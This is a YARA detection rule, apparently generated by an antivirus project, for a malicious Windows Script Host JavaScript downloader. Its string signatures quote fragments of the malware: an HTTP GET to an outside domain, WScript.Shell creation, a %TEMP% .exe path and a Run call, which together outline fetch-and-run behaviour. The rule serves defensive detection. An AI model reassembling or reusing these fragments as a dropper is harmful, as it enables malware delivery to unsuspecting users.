rule sig_20160330_636e217b7683e624d46b7e72b0d1f3f0 {
  meta:
    description = "datamaliciousorder - file 20160330_636e217b7683e624d46b7e72b0d1f3f0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a7d6ecb0b10009fb4daa64bdd38f73ef226a266b5d2a6c50bfbe2b268218b76"

  strings:
    $s1  = "BG[OY](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "function J(W, R0){A = A * 1; return W - R0;};" fullword ascii
    $s3  = "var ZL = function NN() {return WScript[Q](\"WScript\"+\".Shell\");}(), X = 11;" fullword ascii
    $s4  = "if (BG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DI() {return ZL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jQUWM9lO.ex\" + \"e\";};" fullword ascii
    $s6  = "function LZ(){return R + \"\";};" fullword ascii
    $s7  = "function D(VO){ZL[\"Run\"](VO, A, A);};" fullword ascii
    $s8  = "function VP() {return ((GA == true) && (GA == N)) ? 1 : A;};" fullword ascii
    $s9  = "function QK(){return Q;};" fullword ascii
    $s10 = "function CH(SX) {var J0 = (1, 2, 3, 4, 5, SX); return J0;};" fullword ascii
    $s11 = "function NW()" fullword ascii
    $s12 = "}while (BD);" fullword ascii
    $s13 = "var JM = new this[\"Date\"]();" fullword ascii
    $s14 = "return J(BP, T);" fullword ascii
    $s15 = "function VS(){return 22;};" fullword ascii
    $s16 = "N = true; " fullword ascii
    $s17 = "var GA = false;" fullword ascii
    $s18 = "GA = true; " fullword ascii
    $s19 = "var QM = false;" fullword ascii
    $s20 = "} catch(UM){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}